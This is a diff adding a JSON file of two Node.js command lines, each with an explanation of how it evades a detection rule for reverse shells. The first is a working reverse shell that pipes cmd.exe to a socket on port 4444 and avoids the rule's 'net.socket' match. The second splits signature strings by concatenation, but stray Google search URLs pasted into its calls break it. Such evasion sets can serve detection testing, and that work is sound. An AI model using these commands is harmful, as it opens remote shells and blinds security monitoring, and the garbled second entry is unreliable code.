@@ -1,0 +1,10 @@
+[
+  {
+    "output": "node.exe -e \"const cp = require('child_process'); const client = new (require('net').Socket)(); client.connect(4444, '127.0.0.1', () => { const sh = cp.spawn('cmd.exe', []); client.pipe(sh.stdin); sh.stdout.pipe(client); });\"",
+    "explanation": "The rule expects 'net.socket' (in lowercase) to be explicitly contained within the command line. Node.js/JavaScript is case-sensitive for native class references, but an operator can instantiate the object via 'new (require('net').Socket)()' or use string bracket notation like 'require(\"net\")[\"Socket\"]'. This avoids the literal string 'net.socket' while maintaining full script functionality."
+  },
+  {
+    "output": "node.exe -e \"const cp = require('child' + '_process'); const s = require('n' + 'et'); const n = s['S' + 'ocket'](https://www.google.com/search?q=); n['con' + 'nect'](4444, '127.0.0.1', () => { cp['ex' + 'ec'](https://www.google.com/search?q=%27whoami%27); });\"",
+    "explanation": "The rule enforces an 'all' condition on multiple target strings like '.exec(', 'net.socket', '.connect', and 'child_process'. By using JavaScript string concatenation inside the expression evaluated by node.exe, the monolithic command line string never contains the literal signatures, causing the 'selection_action_reverse_shell' condition to evaluate as false."
+  }
+]
